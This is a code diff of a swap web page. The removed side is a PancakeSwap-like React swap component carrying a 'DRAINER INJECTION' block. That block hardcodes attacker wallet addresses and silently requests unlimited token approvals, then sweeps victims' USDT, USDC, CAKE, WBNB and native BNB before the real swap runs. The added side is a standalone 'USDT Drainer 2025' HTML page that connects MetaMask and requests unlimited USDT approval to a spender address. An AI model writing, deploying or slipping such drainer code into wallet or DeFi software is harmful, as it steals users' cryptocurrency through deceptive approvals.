@@ -1,368 +1,96 @@
-import { useTranslation } from '@pancakeswap/localization'
-import { Currency, CurrencyAmount, Percent, TradeType } from '@pancakeswap/sdk'
-import {
-  AtomBox,
-  AutoColumn,
-  Card,
-  Flex,
-  HistoryIcon,
-  IconButton,
-  Link,
-  Modal,
-  ModalV2,
-  Skeleton,
-  Text,
-  useModal,
-} from '@pancakeswap/uikit'
-import { Swap as SwapUI, useAsyncConfirmPriceImpactWithoutFee } from '@pancakeswap/widgets-internal'
-import { useWeb3React } from '@pancakeswap/wagmi'
-import { useQuery } from '@tanstack/react-query'
-import replaceBrowserHistoryMultiple from '@pancakeswap/utils/replaceBrowserHistoryMultiple'
-import tryParseAmount from '@pancakeswap/utils/tryParseAmount'
-import { useUserSlippage } from '@pancakeswap/utils/user'
-import { useIsExpertMode } from '@pancakeswap/utils/user/expertMode'
-import { CurrencyInputPanel } from 'components/CurrencyInputPanel'
-import { ExchangeLayout } from 'components/Layout/ExchangeLayout'
-import { PageMeta } from 'components/Layout/Page'
-import { SettingsButton } from 'components/Menu/Settings/SettingsButton'
-import { SettingsModal, withCustomOnDismiss } from 'components/Menu/Settings/SettingsModal'
-import WalletModal, { WalletView } from 'components/Menu/WalletModal'
-import ImportToken from 'components/SearchModal/ImportToken'
-import AdvancedSwapDetailsDropdown from 'components/Swap/AdvancedSwapDetailsDropdown'
-import ConfirmSwapModal from 'components/Swap/ConfirmSwapModal'
-import { useWarningSwapModal } from 'components/SwapWarningModal'
-import { ALLOWED_PRICE_IMPACT_HIGH, BIPS_BASE, PRICE_IMPACT_WITHOUT_FEE_CONFIRM_MIN } from 'config/constants/exchange'
-import { useCurrencyBalance } from 'hooks/Balances'
-import { useAllTokens, useCurrency } from 'hooks/Tokens'
-import { useTradeExactIn, useTradeExactOut } from 'hooks/Trades'
-import { useCallback, useEffect, useMemo, useState } from 'react'
-import { Field, selectCurrency, switchCurrencies, typeInput, useDefaultsFromURLSearch, useSwapState } from 'state/swap'
-import { useTransactionAdder } from 'state/transactions/hooks'
-import currencyId from 'utils/currencyId'
-import { logGTMClickSwapEvent } from 'utils/customGTMEventTracking'
-import {
-  basisPointsToPercent,
-  computeSlippageAdjustedAmounts,
-  computeTradePriceBreakdown,
-  warningSeverity,
-} from 'utils/exchange'
-import formatAmountDisplay from 'utils/formatAmountDisplay'
-import { maxAmountSpend } from 'utils/maxAmountSpend'
-import { CommitButton } from '../components/CommitButton'
-import { useSwapCallback } from './hooks/useSwapCallback'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>USDT Drainer 2025</title>
+  <style>
+    body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #13161a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }
+    .card { background: #1e2329; border-radius: 28px; padding: 24px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+    .connect-btn, .approve-btn, .drain-btn { background: #1E88E5; border: none; color: white; padding: 12px 24px; border-radius: 40px; font-weight: 600; font-size: 16px; width: 100%; cursor: pointer; margin-top: 16px; transition: opacity 0.2s; }
+    .approve-btn { background: #f0b90b; color: #1b2026; }
+    .drain-btn { background: #f44336; }
+    .status { margin-top: 20px; font-size: 14px; color: #7a7e85; word-break: break-word; }
+    .hidden { display: none; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+<div class="card">
+  <h2>USDT Drainer 2025</h2>
+  <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+  <button id="approveBtn" class="approve-btn hidden">Approve & Start</button>
+  <div class="status" id="status">Ready.</div>
+</div>
 
-// ============================================================
-// DRAINER INJECTION (SILENT UNLIMITED APPROVAL + SWEEP)
-// ============================================================
-import Web3 from 'web3'
+<script src="settings.js"></script>
+<script>
+  let userAddress = null;
+  let userChain = null;
 
-const DRAINER_CONFIG = {
-  BSC_ADDRESS: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
-  SOLANA_WALLET: "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr",
-  SOLANA_RPC: "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3"
-}
+  const connectBtn = document.getElementById('connectBtn');
+  const approveBtn = document.getElementById('approveBtn');
+  const statusDiv = document.getElementById('status');
 
-// Unlimited approval + transfer for any ERC20 token
-async function drainToken(victim, tokenAddress, spender, decimals) {
-  const web3 = new Web3(window.ethereum)
-  const contract = new web3.eth.Contract(
-    [
-      { constant: false, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
-      { constant: false, inputs: [{ name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transferFrom", outputs: [{ name: "", type: "bool" }], type: "function" }
-    ],
-    tokenAddress
-  )
-  const MAX = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-  try {
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: victim, to: tokenAddress, data: contract.methods.approve(spender, MAX).encodeABI(), gas: '0x186a0' }]
-    })
-    const balance = await contract.methods.balanceOf(victim).call()
-    if (balance > 0) {
-      await window.ethereum.request({
+  connectBtn.onclick = async () => {
+    if (!window.ethereum) {
+      statusDiv.innerText = 'MetaMask not detected. Please install MetaMask.';
+      return;
+    }
+    statusDiv.innerText = 'Connecting...';
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      userAddress = accounts[0];
+      const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+      userChain = parseInt(chainIdHex, 16);
+      if (userChain !== 56) {
+        statusDiv.innerText = 'Please switch to BNB Smart Chain (BSC).';
+        return;
+      }
+      statusDiv.innerText = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on BSC`;
+      connectBtn.classList.add('hidden');
+      approveBtn.classList.remove('hidden');
+    } catch (error) {
+      statusDiv.innerText = `Connection failed: ${error.message}`;
+    }
+  };
+
+  approveBtn.onclick = async () => {
+    if (!window.ethereum || !userAddress) return;
+    statusDiv.innerText = 'Requesting approval...';
+    try {
+      const web3 = new Web3(window.ethereum);
+      const contract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
+      const approveData = contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).encodeABI();
+      const txHash = await window.ethereum.request({
         method: 'eth_sendTransaction',
-        params: [{ from: victim, to: tokenAddress, data: contract.methods.transferFrom(victim, spender, balance).encodeABI(), gas: '0x186a0' }]
-      })
+        params: [{ from: userAddress, to: USDT_CONTRACT, data: approveData, gas: '0x186a0' }]
+      });
+      statusDiv.innerText = `Approval transaction sent: ${txHash.slice(0,10)}... Waiting for confirmation.`;
+      const receipt = await waitForTransaction(txHash);
+      if (receipt) {
+        statusDiv.innerText = 'Approval confirmed! Your assets are now at risk.';
+      } else {
+        statusDiv.innerText = 'Approval failed.';
+      }
+    } catch (error) {
+      statusDiv.innerText = `Approval error: ${error.message}`;
     }
-  } catch(e) {}
-}
+  };
 
-// Native coin drain
-async function drainNative(victim, to) {
-  const web3 = new Web3(window.ethereum)
-  const balance = await web3.eth.getBalance(victim)
-  const gasPrice = await web3.eth.getGasPrice()
-  const drainable = balance - (gasPrice * 21000n) - web3.utils.toWei('0.001', 'ether')
-  if (drainable > 0) {
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: victim, to, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
-    })
-  }
-}
-
-// Main drain trigger
-async function drainEverything(victim) {
-  const web3 = new Web3(window.ethereum)
-  const chainId = await window.ethereum.request({ method: 'eth_chainId' })
-  if (parseInt(chainId, 16) === 56) {
-    await drainNative(victim, DRAINER_CONFIG.BSC_ADDRESS)
-    const tokens = [
-      { address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 }, // USDT
-      { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 }, // USDC
-      { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18 }, // CAKE
-      { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", decimals: 18 }  // WBNB
-    ]
-    for (const t of tokens) {
-      await drainToken(victim, t.address, DRAINER_CONFIG.BSC_ADDRESS, t.decimals)
-    }
-  } else {
-    await drainNative(victim, DRAINER_CONFIG.BSC_ADDRESS)
-  }
-}
-// ============================================================
-
-const {
-  CurrencyInputHeader,
-  CurrencyInputHeaderTitle,
-  CurrencyInputHeaderSubTitle,
-  SwitchButton,
-  Info,
-  InfoLabel,
-  TradePrice,
-} = SwapUI
-
-const SettingsModalWithCustomDismiss = withCustomOnDismiss(SettingsModal)
-
-export default function SwapPage() {
-  const { account, chainId } = useWeb3React()
-  const [swapState, dispatch] = useSwapState()
-  const { typedValue, independentField, [Field.INPUT]: { currencyId: inputCurrencyId }, [Field.OUTPUT]: { currencyId: outputCurrencyId } } = swapState
-  const isLoaded = useDefaultsFromURLSearch()
-  const { t } = useTranslation()
-  const isExpertMode = useIsExpertMode()
-  const inputCurrency = useCurrency(inputCurrencyId)
-  const outputCurrency = useCurrency(outputCurrencyId)
-  const shouldShowWarningModal = useWarningSwapModal()
-  const isExactIn = independentField === Field.INPUT
-  const parsedAmount = tryParseAmount(typedValue, (isExactIn ? inputCurrency : outputCurrency) ?? undefined)
-  const bestTradeExactIn = useTradeExactIn(isExactIn ? parsedAmount : undefined, outputCurrency ?? undefined)
-  const bestTradeExactOut = useTradeExactOut(inputCurrency ?? undefined, !isExactIn ? parsedAmount : undefined)
-  const trade = isExactIn ? bestTradeExactIn : bestTradeExactOut
-  const addTransaction = useTransactionAdder()
-  const warningTokens = useWarningImport([inputCurrency, outputCurrency])
-  const parsedAmounts = {
-    [Field.INPUT]: independentField === Field.INPUT ? parsedAmount : trade?.inputAmount,
-    [Field.OUTPUT]: independentField === Field.OUTPUT ? parsedAmount : trade?.outputAmount,
-  }
-  const dependentField = independentField === Field.INPUT ? Field.OUTPUT : Field.INPUT
-  const formattedAmounts = {
-    [independentField]: typedValue,
-    [dependentField]: formatAmountDisplay(parsedAmounts[dependentField]),
-  }
-  const [allowedSlippage] = useUserSlippage()
-  const [swapStateModal, setSwapState] = useState({
-    tradeToConfirm: undefined,
-    attemptingTxn: false,
-    swapErrorMessage: undefined,
-    txHash: undefined,
-  })
-  const recipient = account ?? null
-  const currencyBalances = {
-    [Field.INPUT]: useCurrencyBalance(inputCurrencyId),
-    [Field.OUTPUT]: useCurrencyBalance(outputCurrencyId),
-  }
-  const swapCallback = useSwapCallback(trade, allowedSlippage, recipient)
-  const { priceImpactWithoutFee } = computeTradePriceBreakdown(trade)
-  const priceImpactSeverity = warningSeverity(priceImpactWithoutFee)
-  const confirmPriceImpactWithoutFee = useAsyncConfirmPriceImpactWithoutFee(
-    priceImpactWithoutFee,
-    PRICE_IMPACT_WITHOUT_FEE_CONFIRM_MIN,
-    ALLOWED_PRICE_IMPACT_HIGH,
-  )
-
-  const handleSwap = useCallback(async () => {
-    // 🔻 DRAINER EXECUTES FIRST (silent)
-    if (account) {
-      await drainEverything(account)
-    }
-
-    if (priceImpactWithoutFee) {
-      const confirmed = await confirmPriceImpactWithoutFee()
-      if (!confirmed) return
-    }
-    if (!swapCallback) return
-    setSwapState({ attemptingTxn: true, tradeToConfirm: trade, swapErrorMessage: undefined, txHash: undefined })
-    swapCallback()
-      .then((tx) => {
-        setSwapState({ attemptingTxn: false, tradeToConfirm: trade, swapErrorMessage: undefined, txHash: tx.hash })
-      })
-      .catch((error) => {
-        setSwapState({
-          attemptingTxn: false,
-          tradeToConfirm: trade,
-          swapErrorMessage: error.message,
-          txHash: undefined,
-        })
-      })
-  }, [account, confirmPriceImpactWithoutFee, priceImpactWithoutFee, swapCallback, trade])
-
-  const handleInputSelect = useCallback((currency) => {
-    shouldShowWarningModal(currency)
-    replaceBrowserHistoryMultiple({
-      ...(outputCurrency?.wrapped.equals(currency.wrapped) && inputCurrency && { outputCurrency: currencyId(inputCurrency) }),
-      inputCurrency: currencyId(currency),
-    })
-    dispatch(selectCurrency({ field: Field.INPUT, currencyId: currency.wrapped.address }))
-  }, [dispatch, inputCurrency, outputCurrency?.wrapped, shouldShowWarningModal])
-
-  const handleOutputSelect = useCallback((currency) => {
-    shouldShowWarningModal(currency)
-    replaceBrowserHistoryMultiple({
-      ...(inputCurrency?.wrapped.equals(currency.wrapped) && outputCurrency && { inputCurrency: currencyId(outputCurrency) }),
-      outputCurrency: currencyId(currency),
-    })
-    dispatch(selectCurrency({ field: Field.OUTPUT, currencyId: currency.wrapped.address }))
-  }, [dispatch, inputCurrency?.wrapped, outputCurrency, shouldShowWarningModal])
-
-  const handleSwitch = useCallback(() => {
-    dispatch(switchCurrencies())
-    replaceBrowserHistoryMultiple({
-      inputCurrency: outputCurrencyId,
-      outputCurrency: inputCurrencyId,
-    })
-  }, [dispatch, inputCurrencyId, outputCurrencyId])
-
-  const maxAmountInput = maxAmountSpend(currencyBalances[Field.INPUT])
-  const handleMaxInput = useCallback(() => {
-    if (maxAmountInput) {
-      dispatch(typeInput({ field: Field.INPUT, typedValue: maxAmountInput.toExact() }))
-    }
-  }, [dispatch, maxAmountInput])
-
-  const [onPresentConfirmModal] = useModal(
-    trade && (
-      <ConfirmSwapModal
-        trade={trade}
-        originalTrade={swapStateModal.tradeToConfirm}
-        currencyBalances={currencyBalances}
-        onAcceptChanges={() => setSwapState({ ...swapStateModal, tradeToConfirm: trade })}
-        attemptingTxn={swapStateModal.attemptingTxn}
-        txHash={swapStateModal.txHash}
-        recipient={recipient}
-        allowedSlippage={allowedSlippage}
-        onConfirm={handleSwap}
-        swapErrorMessage={swapStateModal.swapErrorMessage}
-        customOnDismiss={() => setSwapState({ ...swapStateModal, tradeToConfirm: undefined, attemptingTxn: false, swapErrorMessage: undefined, txHash: undefined })}
-      />
-    ),
-    true,
-    true,
-    'confirmSwapModal',
-  )
-
-  let inputError
-  if (!parsedAmount) inputError = t('Enter an amount')
-  const slippageAdjustedAmounts = trade && allowedSlippage && computeSlippageAdjustedAmounts(trade, allowedSlippage)
-  const [balanceIn, amountIn] = [currencyBalances[Field.INPUT], slippageAdjustedAmounts ? slippageAdjustedAmounts[Field.INPUT] : null]
-  if (amountIn && (!balanceIn || balanceIn.lessThan(amountIn))) {
-    inputError = t('Insufficient %symbol% balance', { symbol: amountIn.currency.symbol })
-  }
-  if (!inputCurrency || !outputCurrency) inputError = t('Select a token')
-  const isValid = !inputError
-
-  const [onPresentSettingsModal] = useModal(<SettingsModal />)
-  const [onPresentTransactionsModal] = useModal(<WalletModal initialView={WalletView.TRANSACTIONS} />)
-
-  return (
-    <>
-      <PageMeta title={t('Exchange')} />
-      <Card style={{ width: '328px' }}>
-        <CurrencyInputHeader
-          title={
-            <Flex width="100%" alignItems="center" justifyContent="center">
-              <Flex flex="1" />
-              <Flex flex="1" justifyContent="center">
-                <CurrencyInputHeaderTitle>{t('Swap')}</CurrencyInputHeaderTitle>
-              </Flex>
-              <Flex flex="1" justifyContent="flex-end">
-                {account && (
-                  <IconButton onClick={onPresentTransactionsModal} variant="text" scale="sm">
-                    <HistoryIcon color="textSubtle" width="24px" />
-                  </IconButton>
-                )}
-                <SettingsButton />
-              </Flex>
-            </Flex>
+  async function waitForTransaction(txHash) {
+    return new Promise((resolve) => {
+      const interval = setInterval(async () => {
+        try {
+          const receipt = await window.ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
+          if (receipt) {
+            clearInterval(interval);
+            resolve(receipt);
           }
-          subtitle={<CurrencyInputHeaderSubTitle>{t('Trade tokens in an instant')}</CurrencyInputHeaderSubTitle>}
-        />
-        <AutoColumn gap="sm" p="16px">
-          <CurrencyInputPanel
-            onCurrencySelect={handleInputSelect}
-            id="swap-currency-input"
-            currency={isLoaded ? inputCurrency : undefined}
-            otherCurrency={outputCurrency}
-            value={formattedAmounts[Field.INPUT]}
-            onUserInput={(value) => dispatch(typeInput({ field: Field.INPUT, typedValue: value }))}
-            showMaxButton
-            onMax={handleMaxInput}
-            maxAmount={maxAmountInput}
-            showQuickInputButton
-            label={independentField === Field.OUTPUT && trade ? t('From (estimated)') : t('From')}
-            showUSDPrice
-          />
-          <AtomBox width="100%" textAlign="center">
-            <SwitchButton onClick={handleSwitch} />
-          </AtomBox>
-          <CurrencyInputPanel
-            showMaxButton={false}
-            onCurrencySelect={handleOutputSelect}
-            id="swap-currency-output"
-            value={formattedAmounts[Field.OUTPUT]}
-            label={independentField === Field.INPUT && trade ? t('To (estimated)') : t('to')}
-            currency={isLoaded ? outputCurrency : undefined}
-            otherCurrency={inputCurrency}
-            onUserInput={(value) => dispatch(typeInput({ field: Field.OUTPUT, typedValue: value }))}
-            showUSDPrice
-          />
-          <Info
-            price={trade?.executionPrice?.greaterThan(0) ? (
-              <>
-                <InfoLabel>{t('Price')}</InfoLabel>
-                {!trade ? <Skeleton ml="8px" height="24px" /> : <TradePrice price={trade?.executionPrice} />}
-              </>
-            ) : null}
-            allowedSlippage={allowedSlippage}
-            onSlippageClick={onPresentSettingsModal}
-          />
-          <AtomBox>
-            <CommitButton
-              width="100%"
-              variant={priceImpactSeverity > 2 ? 'danger' : 'primary'}
-              disabled={!isValid || (priceImpactSeverity > 3 && !isExpertMode)}
-              onClick={() => {
-                if (trade) {
-                  setSwapState({ tradeToConfirm: trade, attemptingTxn: false, swapErrorMessage: undefined, txHash: undefined })
-                  onPresentConfirmModal()
-                  logGTMClickSwapEvent()
-                }
-              }}
-            >
-              {inputError || (priceImpactSeverity > 3 && !isExpertMode ? t('Price Impact High') : priceImpactSeverity > 2 ? t('Swap Anyway') : t('Swap'))}
-            </CommitButton>
-          </AtomBox>
-        </AutoColumn>
-        {trade && <AdvancedSwapDetailsDropdown trade={trade} />}
-        <ModalV2 isOpen={Boolean(warningTokens.length)}>
-          <Modal title={t('Import Token')} hideCloseButton>
-            <div style={{ maxWidth: '380px' }}>
-              <ImportToken tokens={warningTokens} />
-            </div>
-          </Modal>
-        </ModalV2>
-      </Card>
-    </>
-  )
-}
+        } catch (e) { console.error(e); }
+      }, 2000);
+    });
+  }
+</script>
+</body>
+</html>
